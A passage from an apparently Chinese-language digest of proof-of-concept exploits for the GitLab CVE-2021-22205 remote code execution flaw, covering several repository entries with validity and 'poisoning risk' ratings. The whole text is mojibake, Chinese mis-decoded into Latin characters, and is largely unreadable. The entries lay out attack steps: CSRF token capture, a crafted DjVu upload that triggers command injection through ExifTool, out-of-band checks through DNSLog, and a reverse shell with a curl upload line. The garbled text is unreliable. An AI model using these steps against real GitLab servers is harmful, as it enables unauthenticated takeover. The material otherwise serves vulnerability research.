æä¾›çš„ Python è„šæœ¬ `22205exp.py` åŒ…å«æ¼æ´žéªŒè¯å’Œåˆ©ç”¨ä»£ç ã€‚ è¯¥è„šæœ¬åˆ©ç”¨ `dnslog.cn` æ¥éªŒè¯å‘½ä»¤æ‰§è¡Œã€‚ è™½ç„¶ `dnslog.cn` æ˜¯ä¸€ç§å¸¸è§çš„æ¼æ´žéªŒè¯æ–¹æ³•ï¼Œä½†å¦‚æžœæ”»å‡»è€…æŽ§åˆ¶ `dnslog.cn`ï¼Œåˆ™å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£Žé™©ï¼Œä»–ä»¬å¯ä»¥è®°å½•æ¼æ´žåˆ©ç”¨ä¿¡æ¯ã€‚ åŒæ—¶ï¼Œè„šæœ¬ä¸­ä½¿ç”¨äº†ç¡¬ç¼–ç çš„User-Agentå’ŒContent-Typeï¼Œè¿™å¢žåŠ äº†è„šæœ¬è¢«è¯†åˆ«å’Œé˜²å¾¡çš„å¯èƒ½æ€§ã€‚å¦‚æžœæ”»å‡»è€…ä¿®æ”¹è¿™äº›å‚æ•°ï¼Œå¯èƒ½ä¼šå¢žåŠ æ”»å‡»çš„æˆåŠŸçŽ‡ï¼Œä½†ä¹Ÿå¯èƒ½è¢«è§†ä¸ºæ½œåœ¨çš„æ¶æ„è¡Œä¸ºã€‚ æ­¤å¤–ï¼Œè¯¥è„šæœ¬ä¾èµ–äºŽ `beautifulsoup4` å’Œ `requests` åº“ã€‚ å¦‚æžœè¿™äº›åº“è¢«æ¶æ„ç¯¡æ”¹ï¼Œå¯èƒ½ä¼šå¯¼è‡´æŠ•æ¯’ã€‚ ç»¼åˆæ¥çœ‹ï¼Œè„šæœ¬æœ¬èº«åŒ…å«ç›´æŽ¥çš„åŽé—¨ä»£ç çš„å¯èƒ½æ€§è¾ƒä½Žï¼Œä½†é—´æŽ¥æŠ•æ¯’é£Žé™©ï¼ˆå¦‚ä¾èµ–åº“æˆ–éªŒè¯å¹³å°è¢«æŽ§åˆ¶ï¼‰ä»ç„¶å­˜åœ¨ï¼Œå› æ­¤æŠ•æ¯’é£Žé™©å¤§çº¦ä¸º10%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  **èŽ·å– CSRF Tokenï¼š** è„šæœ¬é¦–å…ˆè®¿é—® `/users/sign_in` é¡µé¢ï¼Œä½¿ç”¨ `BeautifulSoup` è§£æž HTMLï¼Œæå– CSRF tokenã€‚
2.  **æž„é€ æ¶æ„å›¾åƒæ–‡ä»¶ï¼š** è„šæœ¬æž„é€ ä¸€ä¸ªåŒ…å«æ¶æ„ ExifTool å‘½ä»¤çš„ DJVU æ ¼å¼å›¾åƒæ–‡ä»¶ã€‚è¯¥å‘½ä»¤é€šå¸¸ç”¨äºŽæ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤ï¼Œä¾‹å¦‚é€šè¿‡ `curl` å°†æœåŠ¡å™¨ä¿¡æ¯å‘é€åˆ°æ”»å‡»è€…çš„ DNS æœåŠ¡å™¨ã€‚
3.  **ä¸Šä¼ æ¶æ„å›¾åƒæ–‡ä»¶ï¼š** è„šæœ¬ä½¿ç”¨åŒ…å«æ¶æ„å›¾åƒæ–‡ä»¶å’Œ CSRF token çš„ `multipart/form-data` è¯·æ±‚ï¼Œå°†æ–‡ä»¶ä¸Šä¼ åˆ° `/uploads/user` ç«¯ç‚¹ã€‚
4.  **è§¦å‘å‘½ä»¤æ‰§è¡Œï¼š** GitLab å°è¯•ä½¿ç”¨ ExifTool å¤„ç†è¯¥å›¾åƒï¼Œç”±äºŽæ–‡ä»¶å†…å®¹æ²¡æœ‰ç»è¿‡å……åˆ†éªŒè¯ï¼Œå¯¼è‡´ ExifTool æ‰§è¡ŒåµŒå…¥åœ¨å›¾åƒæ–‡ä»¶ä¸­çš„æ¶æ„å‘½ä»¤ã€‚
5.  **éªŒè¯æ¼æ´žï¼š** è„šæœ¬é€šè¿‡æŸ¥è¯¢ `dnslog.cn` æ¥ç¡®è®¤å‘½ä»¤æ˜¯å¦æˆåŠŸæ‰§è¡Œã€‚

æ€»çš„æ¥è¯´ï¼Œè¯¥æ¼æ´žåˆ©ç”¨çš„æœ‰æ•ˆæ€§è¾ƒé«˜ï¼Œä½†éœ€è¦æ³¨æ„æ½œåœ¨çš„æŠ•æ¯’é£Žé™©ã€‚åˆ©ç”¨æ–¹å¼ç›¸å¯¹ç®€å•ï¼Œå¯ä»¥é€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶æ¥å®žçŽ°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**é¡¹ç›®åœ°å€:** [hhhotdrink/CVE-2021-22205](https://github.com/hhhotdrink/CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #14

**æ¥æº**: [CVE-2021-22205-honypot_CVE-2021-22205.md](../2021/CVE-2021-22205-honypot_CVE-2021-22205.md)

## CVE-2021-22205-GitLab-RCE

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ(RCE)

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯å¯¼è‡´å®Œå…¨æŽ§åˆ¶å—å½±å“çš„GitLabå®žä¾‹

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** æœªç»èº«ä»½éªŒè¯çš„ç½‘ç»œè®¿é—®ï¼Œä»¥åŠç›®æ ‡GitLabå®žä¾‹å­˜åœ¨æ¼æ´žã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 20%

## è¯¦æƒ…

CVE-2021-22205æ˜¯GitLab CE/EEä¸­çš„ä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´žã€‚ç”±äºŽGitLabæ²¡æœ‰æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶ï¼Œå¯¼è‡´äº†å‘½ä»¤æ³¨å…¥ã€‚æ”»å‡»è€…å¯ä»¥ä¸Šä¼ ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶ï¼Œåˆ©ç”¨ExifToolçš„æ¼æ´žæ‰§è¡Œä»»æ„ä»£ç ã€‚

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„POCä»£ç åˆ©ç”¨Docker Composeéƒ¨ç½²äº†ä¸€ä¸ªåŒ…å«æ¼æ´žçš„GitLab EE 13.9.5å®žä¾‹ï¼Œè¡¨æ˜Žè¯¥POCæ˜¯æœ‰æ•ˆçš„ï¼Œå¯ä»¥å¤çŽ°è¯¥æ¼æ´žã€‚

**æŠ•æ¯’é£Žé™©ï¼š**
å°½ç®¡å¤§éƒ¨åˆ†ä»£ç çœ‹èµ·æ¥æ˜¯ä¸ºäº†å¤çŽ°æ¼æ´žï¼Œä½†ä»ç„¶å­˜åœ¨ä¸€äº›æ½œåœ¨çš„æŠ•æ¯’é£Žé™©ã€‚
*   `gitlab/entry.sh`è„šæœ¬æ·»åŠ äº†ä¸€ä¸ªåä¸º`eth1`çš„è™šæ‹Ÿç½‘ç»œæŽ¥å£ï¼Œå¹¶åˆ†é…äº†ä¸€ä¸ªå…¬ç½‘IPåœ°å€ã€‚è¿™æœ¬èº«å¹¶æ²¡æœ‰æ¶æ„ï¼Œä½†å¦‚æžœæ”»å‡»è€…æŽ§åˆ¶äº†GitLabå®žä¾‹ï¼Œåˆ™å¯èƒ½åˆ©ç”¨æ­¤æŽ¥å£è¿›è¡Œéšè”½é€šä¿¡æˆ–æ•°æ®æ³„éœ²ã€‚å¯èƒ½æ€§ä¸º10%ã€‚
* `gitlab/dummy/backup.txt`åŒ…å«äº†ä¸€ä¸ªé»˜è®¤çš„ç”¨æˆ·åå¯†ç ,å¦‚æžœè¢«åˆ©ç”¨,å­˜åœ¨å®‰å…¨é£Žé™©ã€‚å¯èƒ½æ€§ä¸º10%.

æ€»ä½“çš„æŠ•æ¯’é£Žé™©è¯„ä¼°ä¸º20%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…éœ€è¦æž„å»ºä¸€ä¸ªæ¶æ„å›¾åƒæ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«åµŒå…¥çš„ExifToolå‘½ä»¤æ³¨å…¥Payloadã€‚
2.  æ”»å‡»è€…å°†æ¶æ„å›¾åƒä¸Šä¼ åˆ°æ˜“å—æ”»å‡»çš„GitLabå®žä¾‹ï¼ˆä¾‹å¦‚ï¼Œé€šè¿‡å¤´åƒä¸Šä¼ ã€é¡¹ç›®é™„ä»¶ç­‰ï¼‰ã€‚
3.  GitLabå°è¯•å¤„ç†å›¾åƒï¼Œè°ƒç”¨ExifToolã€‚
4.  ExifToolæ‰§è¡Œæ³¨å…¥çš„å‘½ä»¤ï¼Œä»Žè€Œå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**é¡¹ç›®åœ°å€:** [honypot/CVE-2021-22205](https://github.com/honypot/CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #15

**æ¥æº**: [CVE-2021-22205-inspiringz_CVE-2021-22205.md](../2021/CVE-2021-22205-inspiringz_CVE-2021-22205.md)

## CVE-2021-22205-GitLab-RCE

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼ŒæœªæŽˆæƒè¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡GitLabå®žä¾‹å­˜åœ¨æ¼æ´žï¼Œå¯ç½‘ç»œè®¿é—®

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 10%

## è¯¦æƒ…

CVE-2021-22205æ˜¯GitLab CE/EEä¸­çš„ä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´žã€‚è¯¥æ¼æ´žæºäºŽGitLabæœªèƒ½æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶ï¼Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸Šä¼ åŒ…å«æ¶æ„ExifToolå…ƒæ•°æ®çš„å›¾åƒæ–‡ä»¶æ¥åˆ©ç”¨æ­¤æ¼æ´žã€‚

**æœ‰æ•ˆæ€§ï¼š**
æ ¹æ®æä¾›çš„æ¼æ´žä¿¡æ¯å’Œæ¼æ´žåˆ©ç”¨ä»£ç ï¼Œå¯ä»¥åˆ¤æ–­è¯¥POCä»£ç æ˜¯æœ‰æ•ˆçš„ã€‚æ¼æ´žåº“ä¿¡æ¯è¡¨æ˜Žè¯¥æ¼æ´žå½±å“å¤šä¸ªGitLabç‰ˆæœ¬ï¼Œä¸”CVSSè¯„åˆ†ä¸º10ï¼Œå±žäºŽä¸¥é‡çº§åˆ«ã€‚æ¼æ´žåˆ©ç”¨ä»£ç æ—¨åœ¨åˆ©ç”¨ExifToolåœ¨å¤„ç†æ¶æ„å›¾åƒæ—¶çš„å‘½ä»¤æ³¨å…¥æ¼æ´žã€‚

**æŠ•æ¯’é£Žé™©ï¼š**
æä¾›çš„æ¼æ´žåˆ©ç”¨ä»£ç çœ‹èµ·æ¥åƒæ˜¯åˆ©ç”¨CVE-2021-22205æ¼æ´žçš„exploitï¼Œç”¨äºŽè¿œç¨‹ä»£ç æ‰§è¡Œã€‚å…¶ä¸­å®šä¹‰äº†Sessionsç±»ä»¥æ–¹ä¾¿å‘é€HTTPè¯·æ±‚, å¹¶ä¸”ä½¿ç”¨äº†DNSLogï¼ŒPostBinï¼ŒRequestBinç­‰æœåŠ¡ä½œä¸ºéªŒè¯æ¼æ´žçš„æ–¹å¼ã€‚ä»£ç ä¸­`random_str`å‡½æ•°ç”¨äºŽç”Ÿæˆéšæœºå­—ç¬¦ä¸²ï¼Œè¿™åœ¨æ¼æ´žåˆ©ç”¨ä¸­å¾ˆå¸¸è§ï¼Œç”¨äºŽé¿å…è¢«ç®€å•è§„åˆ™æ£€æµ‹ã€‚`/tmp/5c52ea306e0854cb73063a671293313c/CVE-2021-22205.py`è¡¨æ˜Žè¯¥è„šæœ¬ä½äºŽä¸´æ—¶æ–‡ä»¶å¤¹ï¼Œå¯èƒ½è¡¨æ˜Žæ˜¯ä¸€ä¸ªæå–å‡ºæ¥çš„æˆ–è€…ä¸‹è½½çš„åˆ©ç”¨è„šæœ¬ã€‚ä»£ç ä¸­å­˜åœ¨å¯¹ä¸€äº›å¤–éƒ¨æœåŠ¡çš„è°ƒç”¨ï¼Œæ¯”å¦‚DNSLogï¼ŒRequestBinç­‰ï¼Œä½œè€…å¯èƒ½é€šè¿‡è¿™äº›æœåŠ¡æ¥æ”¶é›†ä¸€äº›ä¿¡æ¯ã€‚å› æ­¤ï¼Œå­˜åœ¨ä¸€å®šè¢«æŠ•æ¯’çš„é£Žé™©ï¼Œä¾‹å¦‚ä½œè€…åœ¨è„šæœ¬ä¸­åµŒå…¥æ¶æ„ä»£ç ï¼Œåˆ©ç”¨ç›®æ ‡æœåŠ¡å™¨çš„èµ„æºè¿›è¡ŒæŒ–çŸ¿æˆ–è€…å…¶ä»–æ¶æ„è¡Œä¸ºã€‚æ­¤å¤–ï¼ŒDNSLogå¦‚æžœè¢«æ¶æ„åŠ«æŒï¼Œå¯èƒ½å¯¼è‡´ä¿¡æ¯æ³„éœ²ã€‚ç»¼ä¸Šæ‰€è¿°ï¼Œå­˜åœ¨10%çš„æŠ•æ¯’å¯èƒ½æ€§ï¼Œè¯·ä»”ç»†å®¡è®¡ä»£ç ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  **èŽ·å–CSRF Tokenå’ŒSession Cookieï¼š** æ¼æ´žåˆ©ç”¨çš„ç¬¬ä¸€æ­¥æ˜¯èŽ·å–æœ‰æ•ˆçš„CSRF Tokenå’ŒSession Cookieã€‚POCä»£ç é¦–å…ˆå°è¯•è®¿é—® `/users/sign_in`ã€`/help` æˆ– `/explore` é¡µé¢ï¼Œç„¶åŽä»Žä¸­æå–æ‰€éœ€çš„tokenå’Œcookieã€‚
2.  **ä¸Šä¼ æ¶æ„å›¾åƒï¼š** åˆ©ç”¨èŽ·å–çš„CSRF Tokenå’ŒSession Cookieï¼Œæ”»å‡»è€…å¯ä»¥ä¸Šä¼ ä¸€ä¸ªç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶ã€‚è¯¥å›¾åƒæ–‡ä»¶çš„Exifå…ƒæ•°æ®ä¸­åŒ…å«æ¶æ„å‘½ä»¤ï¼Œè¿™äº›å‘½ä»¤å°†åœ¨GitLabæœåŠ¡å™¨ä¸Šç”±ExifToolæ‰§è¡Œã€‚
3.  **è¿œç¨‹ä»£ç æ‰§è¡Œï¼š** å½“GitLabæœåŠ¡å™¨å°è¯•å¤„ç†ä¸Šä¼ çš„å›¾åƒæ–‡ä»¶æ—¶ï¼ŒExifToolä¼šæ‰§è¡Œå›¾åƒå…ƒæ•°æ®ä¸­åµŒå…¥çš„æ¶æ„å‘½ä»¤ï¼Œä»Žè€Œå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚
4.  **OOBï¼ˆå¸¦å¤–ï¼‰éªŒè¯ï¼š**  POCä»£ç åˆå§‹åŒ–äº†DNSLogï¼ŒRequestBinç­‰æœåŠ¡ï¼Œç”¨äºŽéªŒè¯æ¼æ´žã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡DNSæŸ¥è¯¢æˆ–è€…HTTPè¯·æ±‚çš„æ–¹å¼æ¥ç¡®å®šå‘½ä»¤æ˜¯å¦æˆåŠŸæ‰§è¡Œã€‚

**é¡¹ç›®åœ°å€:** [inspiringz/CVE-2021-22205](https://github.com/inspiringz/CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #16

**æ¥æº**: [CVE-2021-22205-keven1z_CVE-2021-22205.md](../2021/CVE-2021-22205-keven1z_CVE-2021-22205.md)

## CVE-2021-22205-GitLab-RCE

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** ä¸¥é‡ï¼Œå¯å¯¼è‡´å®Œå…¨ç³»ç»ŸæŽ§åˆ¶

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** æ— éœ€èº«ä»½éªŒè¯ï¼Œç›®æ ‡GitLabå®žä¾‹å¯ä»Žç½‘ç»œè®¿é—®

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 10%

## è¯¦æƒ…

CVE-2021-22205 æ˜¯ä¸€ä¸ªå½±å“ GitLab CE/EE çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´žã€‚è¯¥æ¼æ´žå­˜åœ¨äºŽå›¾åƒæ–‡ä»¶è§£æžè¿‡ç¨‹ä¸­ï¼Œç”±äºŽ GitLab æ²¡æœ‰æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶ï¼Œå¯¼è‡´å¯ä»¥æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„ POC ä»£ç æœ‰æ•ˆã€‚å®ƒåˆ©ç”¨ ExifTool ä¸­çš„å‘½ä»¤æ³¨å…¥æ¼æ´žï¼Œé€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„ DJVU å›¾åƒæ–‡ä»¶æ¥æ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤ã€‚

**æŠ•æ¯’é£Žé™©ï¼š**
POC ä»£ç ä¸­å­˜åœ¨è½»å¾®çš„æŠ•æ¯’é£Žé™©ã€‚é£Žé™©ä¸º10%ã€‚

ä»¥ä¸‹æ˜¯å¯¹ä»£ç ä¸­å¯èƒ½å­˜åœ¨çš„æŠ•æ¯’é£Žé™©ç‚¹çš„åˆ†æžï¼š

*   **ç¡¬ç¼–ç çš„User-Agent:**  POC ä½¿ç”¨äº† `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36`ã€‚è¿™å¯èƒ½æ˜¯ä¸ºäº†ç»•è¿‡æŸäº›ç®€å•çš„ WAF è§„åˆ™ï¼Œä½†ä¹Ÿå¯èƒ½å¯¼è‡´æŒ‡çº¹è¯†åˆ«ï¼Œä»Žè€Œä½¿æ”»å‡»æ›´å®¹æ˜“è¢«æ£€æµ‹ã€‚è™½ç„¶ä¸ç®—æ¶æ„ï¼Œä½†ä¸å¤Ÿçµæ´»ï¼Œå¯èƒ½å½±å“åˆ©ç”¨æ•ˆæžœã€‚
*   **Payloadå®šæ­»ï¼Œç¼ºå°‘éšæœºæ€§ï¼š**POCä¸­ç”¨äºŽè§¦å‘æ¼æ´žçš„DJVUæ–‡ä»¶å†…å®¹ç›¸å¯¹å›ºå®šã€‚è™½ç„¶ä¿®æ”¹äº†commandéƒ¨åˆ†,ä½†æ˜¯å¦‚æžœç›®æ ‡ç³»ç»Ÿå¯¹ä¸Šä¼ æ–‡ä»¶è¿›è¡Œæ›´ä¸¥æ ¼çš„æ ¡éªŒï¼Œè¿™ç§å›ºå®šçš„Payloadå¯èƒ½ä¼šå¯¼è‡´åˆ©ç”¨å¤±è´¥ã€‚å¦‚æžœpayloadåŠ å…¥éšæœºåŒ–,å¯¹æ”»å‡»æ›´åŠ æœ‰åˆ©ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…é¦–å…ˆå‘é€ä¸€ä¸ª GET è¯·æ±‚åˆ° `/users/sign_in` èŽ·å– CSRF tokenã€‚è¯¥tokenç”¨äºŽåŽç»­çš„postè¯·æ±‚çš„è®¤è¯ã€‚
2.  æ”»å‡»è€…æž„é€ ä¸€ä¸ªæ¶æ„çš„ DJVU å›¾åƒæ–‡ä»¶ã€‚è¯¥å›¾åƒæ–‡ä»¶åœ¨ metadata å­—æ®µä¸­åµŒå…¥æ¶æ„å‘½ä»¤ã€‚
3.  æ”»å‡»è€…æž„é€ ä¸€ä¸ª multipart/form-data è¯·æ±‚ï¼Œå°†æ¶æ„å›¾åƒæ–‡ä»¶ä½œä¸ºæ–‡ä»¶ä¸Šä¼ åˆ° `/uploads/user` è·¯å¾„ã€‚
4.  å½“ GitLab å¤„ç†ä¸Šä¼ çš„å›¾åƒæ—¶ï¼ŒExifTool ä¼šè¢«è°ƒç”¨æ¥æå–å›¾åƒå…ƒæ•°æ®ã€‚ç”±äºŽå›¾åƒæ–‡ä»¶ä¸­çš„æ¶æ„å‘½ä»¤ï¼ŒExifTool ä¼šæ‰§è¡Œè¿™äº›å‘½ä»¤ï¼Œä»Žè€Œå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚
5.  åˆ©ç”¨ä»£ç ä¸­ï¼Œcommandå˜é‡å¯ä»¥å®šä¹‰åå¼¹shellæˆ–è€…æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**é¡¹ç›®åœ°å€:** [keven1z/CVE-2021-22205](https://github.com/keven1z/CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #17

**æ¥æº**: [CVE-2021-22205-momika233_cve-2021-22205-GitLab-13.10.2---Remote-Code-Execution-RCE-Unauthenticated-.md](../2021/CVE-2021-22205-momika233_cve-2021-22205-GitLab-13.10.2---Remote-Code-Execution-RCE-Unauthenticated-.md)

## CVE-2021-22205-GitLab-RCE

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** å¯ä»Žç½‘ç»œè®¿é—®å­˜åœ¨æ¼æ´žçš„GitLabå®žä¾‹ï¼Œä¸”å®žä¾‹ç‰ˆæœ¬åœ¨å—å½±å“èŒƒå›´å†…

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 0%

## è¯¦æƒ…

CVE-2021-22205 æ¼æ´žæ˜¯ GitLab CE/EE ç‰ˆæœ¬ä¸­å­˜åœ¨çš„ä¸€ä¸ªæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´žã€‚æ¼æ´žåŽŸå› æ˜¯ GitLab æœªèƒ½æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶ã€‚æ”»å‡»è€…å¯ä»¥ä¸Šä¼ ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶ï¼ˆä¾‹å¦‚ï¼ŒDjVuæ–‡ä»¶ï¼‰åˆ©ç”¨ ExifTool ä¸­çš„å‘½ä»¤æ³¨å…¥æ¼æ´žæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„PoCä»£ç çœ‹èµ·æ¥æœ‰æ•ˆã€‚å®ƒåŒ…å«ä¸¤ä¸ªä¸»è¦æ­¥éª¤ï¼š
1.  **ç”ŸæˆPayloadï¼š**  PoC é¦–å…ˆç”Ÿæˆä¸€ä¸ªåä¸º lol.jpg çš„ DjVu å›¾åƒï¼Œè¯¥å›¾åƒåŒ…å«ä¸€ä¸ªåå‘ shell çš„ Payloadã€‚è¯¥Payloadä½¿ç”¨ `base64` ç¼–ç å¹¶æ‹¼æŽ¥shellå‘½ä»¤åˆ°æ–‡ä»¶æœ«å°¾. Payloadå»ºç«‹ä¸Ž `10.0.0.3` ç«¯å£ `1270` çš„åå‘è¿žæŽ¥ï¼Œå¹¶åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šæ‰§è¡Œå‘½ä»¤ã€‚
2.  **å‘é€Payloadï¼š**  PoC ä½¿ç”¨ `curl` å‘½ä»¤å°†ç”Ÿæˆçš„ lol.jpg æ–‡ä»¶ä¸Šä¼ åˆ° GitLab å®žä¾‹ã€‚`-F 'file=@lol.jpg'` å‚æ•°å°†æ–‡ä»¶ä½œä¸º POST è¯·æ±‚çš„ä¸€éƒ¨åˆ†å‘é€ã€‚`http://10.0.0.7/$(openssl rand -hex 8)` è¡¨ç¤ºæ”»å‡»è€…å¯ä»¥é€šè¿‡ä»»æ„ endpoint è§¦å‘è¯¥æ¼æ´žã€‚

**æŠ•æ¯’é£Žé™©ï¼š**
é€šè¿‡åˆ†æžPoCä»£ç ï¼Œæ²¡æœ‰å‘çŽ°æ˜Žæ˜¾çš„æŠ•æ¯’è¿¹è±¡ã€‚è¯¥ä»£ç æ—¨åœ¨ç”Ÿæˆå¹¶ä¸Šä¼ ä¸€ä¸ªåŒ…å«åå‘ shell çš„å›¾åƒæ–‡ä»¶ã€‚æ‰€æœ‰æ“ä½œéƒ½æ˜¯ä¸ºäº†åˆ©ç”¨æ¼æ´žï¼Œå¹¶æ²¡æœ‰æ·»åŠ ä»»ä½•ä¸Žæ¼æ´žåˆ©ç”¨æ— å…³çš„æ¶æ„ä»£ç ã€‚å› æ­¤ï¼ŒæŠ•æ¯’é£Žé™©è¯„ä¼°ä¸º 0%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
åˆ©ç”¨æ–¹å¼å¦‚ä¸‹ï¼š
1.  æ”»å‡»è€…æž„é€ æ¶æ„çš„DjVuå›¾åƒï¼Œè¯¥å›¾åƒåµŒå…¥äº†å‘½ä»¤æ³¨å…¥Payloadã€‚
2.  æ”»å‡»è€…é€šè¿‡ä¸Šä¼ åŠŸèƒ½ï¼Œå°†æž„é€ çš„å›¾åƒä¸Šä¼ åˆ°å­˜åœ¨æ¼æ´žçš„GitLabå®žä¾‹ã€‚ç”±äºŽæœªè¿›è¡Œå……åˆ†çš„éªŒè¯ï¼Œä¸Šä¼ è¿‡ç¨‹ä¸ä¼šé˜»æ­¢æ¶æ„å›¾åƒã€‚
3.  GitLabåœ¨å¤„ç†å›¾åƒæ—¶ï¼Œè°ƒç”¨ExifToolç­‰å›¾åƒå¤„ç†å·¥å…·ã€‚
4.  ExifToolè§£æžæ¶æ„å›¾åƒï¼Œæ‰§è¡Œå…¶ä¸­åµŒå…¥çš„æ¶æ„å‘½ä»¤ï¼Œä»Žè€Œå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚
5.  æ”»å‡»è€…é€šè¿‡åå‘shellèŽ·å–å¯¹GitLabæœåŠ¡å™¨çš„è®¿é—®æƒé™ï¼Œä»Žè€Œå®žçŽ°å¯¹ç³»ç»Ÿçš„æŽ§åˆ¶ã€‚

**é¡¹ç›®åœ°å€:** [momika233/cve-2021-22205-GitLab-13.10.2---Remote-Code-Execution-RCE-Unauthenticated-](https://github.com/momika233/cve-2021-22205-GitLab-13.10.2---Remote-Code-Execution-RCE-Unauthenticated-)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #18

**æ¥æº**: [CVE-2021-22205-mr-r3bot_Gitlab-CVE-2021-22205.md](../2021/CVE-2021-22205-mr-r3bot_Gitlab-CVE-2021-22205.md)

## CVE-2021-22205-GitLab-RCE

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** ä¸¥é‡ï¼Œå¯èƒ½å¯¼è‡´å®Œå…¨æŽ§åˆ¶æœåŠ¡å™¨

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦ç›®æ ‡GitLabå®žä¾‹è¿è¡Œåœ¨å—å½±å“çš„ç‰ˆæœ¬ï¼Œå¹¶ä¸”èƒ½å¤Ÿé€šè¿‡ç½‘ç»œè®¿é—®

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 0%

## è¯¦æƒ…

